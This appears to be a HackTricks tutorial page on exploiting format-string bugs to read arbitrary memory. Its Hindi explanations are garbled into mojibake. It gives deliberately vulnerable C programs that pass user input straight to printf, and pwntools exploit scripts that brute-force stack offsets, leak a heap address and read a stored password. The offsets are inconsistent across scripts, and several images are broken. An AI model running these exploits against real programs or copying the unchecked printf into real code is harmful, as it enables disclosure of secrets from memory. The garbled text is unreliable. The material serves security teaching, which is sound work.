# Format Strings - Arbitrary Read Example

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ЁЯТм [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ЁЯРж [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## рдмрд╛рдЗрдирд░реА рдкрдврд╝реЗрдВ рдкреНрд░рд╛рд░рдВрдн

### рдХреЛрдб
```c
#include <stdio.h>

int main(void) {
char buffer[30];

fgets(buffer, sizeof(buffer), stdin);

printf(buffer);
return 0;
}
```
рдЗрд╕реЗ рд╕рдВрдХрд▓рд┐рдд рдХрд░реЗрдВ:
```python
clang -o fs-read fs-read.c -Wno-format-security -no-pie
```
### рд╢реЛрд╖рдг
```python
from pwn import *

p = process('./fs-read')

payload = f"%11$s|||||".encode()
payload += p64(0x00400000)

p.sendline(payload)
log.info(p.clean())
```
* **рдСрдлрд╕реЗрдЯ 11 рд╣реИ** рдХреНрдпреЛрдВрдХрд┐ рдХрдИ A рд╕реЗрдЯ рдХрд░рдиреЗ рдФрд░ **рдмреНрд░реВрдЯ-рдлреЛрд░реНрд╕рд┐рдВрдЧ** рдХрд░рдиреЗ рд╕реЗ 0 рд╕реЗ 50 рддрдХ рдХреЗ рд▓реВрдк рдореЗрдВ рдпрд╣ рдкрд╛рдпрд╛ рдЧрдпрд╛ рдХрд┐ рдСрдлрд╕реЗрдЯ 11 рдкрд░ рдФрд░ 5 рдЕрддрд┐рд░рд┐рдХреНрдд рд╡рд░реНрдгреЛрдВ (рд╣рдорд╛рд░реЗ рдорд╛рдорд▓реЗ рдореЗрдВ рдкрд╛рдЗрдк `|`) рдХреЗ рд╕рд╛рде, рдПрдХ рдкреВрд░реНрдг рдкрддреЗ рдХреЛ рдирд┐рдпрдВрддреНрд░рд┐рдд рдХрд░рдирд╛ рд╕рдВрднрд╡ рд╣реИред
* рдореИрдВрдиреЗ **`%11$p`** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдкреИрдбрд┐рдВрдЧ рдХреЗ рд╕рд╛рде рддрд╛рдХрд┐ рдкрддрд╛ рдкреВрд░реА рддрд░рд╣ рд╕реЗ 0x4141414141414141 рд╣реЛред
* **рдлреЙрд░реНрдореЗрдЯ рд╕реНрдЯреНрд░рд┐рдВрдЧ рдкреЗрд▓реЛрдб рдкрддрд╛ рд╕реЗ рдкрд╣рд▓реЗ рд╣реИ** рдХреНрдпреЛрдВрдХрд┐ **printf рдПрдХ рдирд▓ рдмрд╛рдЗрдЯ рдкрд░ рдкрдврд╝рдирд╛ рдмрдВрдж рдХрд░ рджреЗрддрд╛ рд╣реИ**, рдЗрд╕рд▓рд┐рдП рдпрджрд┐ рд╣рдо рдкрддрд╛ рднреЗрдЬрддреЗ рд╣реИрдВ рдФрд░ рдлрд┐рд░ рдлреЙрд░реНрдореЗрдЯ рд╕реНрдЯреНрд░рд┐рдВрдЧ, рддреЛ printf рдХрднреА рднреА рдлреЙрд░реНрдореЗрдЯ рд╕реНрдЯреНрд░рд┐рдВрдЧ рддрдХ рдирд╣реАрдВ рдкрд╣реБрдВрдЪреЗрдЧрд╛ рдХреНрдпреЛрдВрдХрд┐ рдПрдХ рдирд▓ рдмрд╛рдЗрдЯ рдкрд╣рд▓реЗ рд╣реА рдорд┐рд▓ рдЬрд╛рдПрдЧреАред
* рдЪрдпрдирд┐рдд рдкрддрд╛ 0x00400000 рд╣реИ рдХреНрдпреЛрдВрдХрд┐ рдпрд╣реАрдВ рдмрд╛рдЗрдирд░реА рд╢реБрд░реВ рд╣реЛрддреА рд╣реИ (рдХреЛрдИ PIE рдирд╣реАрдВ)

<figure><img src="broken-reference" alt="" width="477"><figcaption></figcaption></figure>

## рдкрд╛рд╕рд╡рд░реНрдб рдкрдврд╝реЗрдВ
```c
#include <stdio.h>
#include <string.h>

char bss_password[20] = "hardcodedPassBSS"; // Password in BSS

int main() {
char stack_password[20] = "secretStackPass"; // Password in stack
char input1[20], input2[20];

printf("Enter first password: ");
scanf("%19s", input1);

printf("Enter second password: ");
scanf("%19s", input2);

// Vulnerable printf
printf(input1);
printf("\n");

// Check both passwords
if (strcmp(input1, stack_password) == 0 && strcmp(input2, bss_password) == 0) {
printf("Access Granted.\n");
} else {
printf("Access Denied.\n");
}

return 0;
}
```
рдЗрд╕реЗ рд╕рдВрдХрд▓рд┐рдд рдХрд░реЗрдВ:
```bash
clang -o fs-read fs-read.c -Wno-format-security
```
### рд╕реНрдЯреИрдХ рд╕реЗ рдкрдврд╝реЗрдВ

**`stack_password`** рд╕реНрдЯреИрдХ рдореЗрдВ рд╕рдВрдЧреНрд░рд╣реАрдд рд╣реЛрдЧрд╛ рдХреНрдпреЛрдВрдХрд┐ рдпрд╣ рдПрдХ рд╕реНрдерд╛рдиреАрдп рдЪрд░ рд╣реИ, рдЗрд╕рд▓рд┐рдП рд╕реНрдЯреИрдХ рдХреА рд╕рд╛рдордЧреНрд░реА рджрд┐рдЦрд╛рдиреЗ рдХреЗ рд▓рд┐рдП printf рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдирд╛ рдкрд░реНрдпрд╛рдкреНрдд рд╣реИред рдпрд╣ рдкрд╣рд▓реЗ 100 рд╕реНрдерд╛рдиреЛрдВ рдХреЛ BF рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ рдПрдХреНрд╕рдкреНрд▓реЙрдЗрдЯ рд╣реИ рддрд╛рдХрд┐ рд╕реНрдЯреИрдХ рд╕реЗ рдкрд╛рд╕рд╡рд░реНрдб рд▓реАрдХ рд╣реЛ рд╕рдХреЗрдВ:
```python
from pwn import *

for i in range(100):
print(f"Try: {i}")
payload = f"%{i}$s\na".encode()
p = process("./fs-read")
p.sendline(payload)
output = p.clean()
print(output)
p.close()
```
In the image it's possible to see that we can leak the password from the stack in the `10th` position:

<figure><img src="../../.gitbook/assets/image (1234).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (1233).png" alt="" width="338"><figcaption></figcaption></figure>

### рдбреЗрдЯрд╛ рдкрдврд╝реЗрдВ

Running the same exploit but with `%p` instead of `%s` it's possible to leak a heap address from the stack at `%25$p`. Moreover, comparing the leaked address (`0xaaaab7030894`) with the position of the password in memory in that process we can obtain the addresses difference:

<figure><img src="broken-reference" alt="" width="563"><figcaption></figcaption></figure>

Now it's time to find how to control 1 address in the stack to access it from the second format string vulnerability:
```python
from pwn import *

def leak_heap(p):
p.sendlineafter(b"first password:", b"%5$p")
p.recvline()
response = p.recvline().strip()[2:] #Remove new line and "0x" prefix
return int(response, 16)

for i in range(30):
p = process("./fs-read")

heap_leak_addr = leak_heap(p)
print(f"Leaked heap: {hex(heap_leak_addr)}")

password_addr = heap_leak_addr - 0x126a

print(f"Try: {i}")
payload = f"%{i}$p|||".encode()
payload += b"AAAAAAAA"

p.sendline(payload)
output = p.clean()
print(output.decode("utf-8"))
p.close()
```
рдФрд░ рдпрд╣ рд╕рдВрднрд╡ рд╣реИ рдХрд┐ **try 14** рдореЗрдВ рдЙрдкрдпреЛрдЧ рдХрд┐рдП рдЧрдП рдкрд╛рд╕рд┐рдВрдЧ рдХреЗ рд╕рд╛рде рд╣рдо рдПрдХ рдкрддреЗ рдХреЛ рдирд┐рдпрдВрддреНрд░рд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:

<figure><img src="broken-reference" alt="" width="563"><figcaption></figcaption></figure>

### Exploit
```python
from pwn import *

p = process("./fs-read")

def leak_heap(p):
# At offset 25 there is a heap leak
p.sendlineafter(b"first password:", b"%25$p")
p.recvline()
response = p.recvline().strip()[2:] #Remove new line and "0x" prefix
return int(response, 16)

heap_leak_addr = leak_heap(p)
print(f"Leaked heap: {hex(heap_leak_addr)}")

# Offset calculated from the leaked position to the possition of the pass in memory
password_addr = heap_leak_addr + 0x1f7bc

print(f"Calculated address is: {hex(password_addr)}")

# At offset 14 we can control the addres, so use %s to read the string from that address
payload = f"%14$s|||".encode()
payload += p64(password_addr)

p.sendline(payload)
output = p.clean()
print(output)
p.close()
```
<figure><img src="broken-reference" alt="" width="563"><figcaption></figcaption></figure>

{% hint style="success" %}
рд╕реАрдЦреЗрдВ рдФрд░ AWS рд╣реИрдХрд┐рдВрдЧ рдХрд╛ рдЕрднреНрдпрд╛рд╕ рдХрд░реЗрдВ:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
рд╕реАрдЦреЗрдВ рдФрд░ GCP рд╣реИрдХрд┐рдВрдЧ рдХрд╛ рдЕрднреНрдпрд╛рд╕ рдХрд░реЗрдВ: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░реЗрдВ</summary>

* [**рд╕рджрд╕реНрдпрддрд╛ рдпреЛрдЬрдирд╛рдПрдБ**](https://github.com/sponsors/carlospolop) рджреЗрдЦреЗрдВ!
* **рд╣рдорд╛рд░реЗ** ЁЯТм [**Discord рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**telegram рд╕рдореВрд╣**](https://t.me/peass) рдореЗрдВ рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ рдпрд╛ **рд╣рдорд╛рд░рд╛ рдЕрдиреБрд╕рд░рдг рдХрд░реЗрдВ** **Twitter** ЁЯРж [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ рдФрд░** [**HackTricks**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github рд░рд┐рдкреЛрдЬрд┐рдЯрд░реА рдореЗрдВ PR рд╕рдмрдорд┐рдЯ рдХрд░реЗрдВред

</details>
{% endhint %}
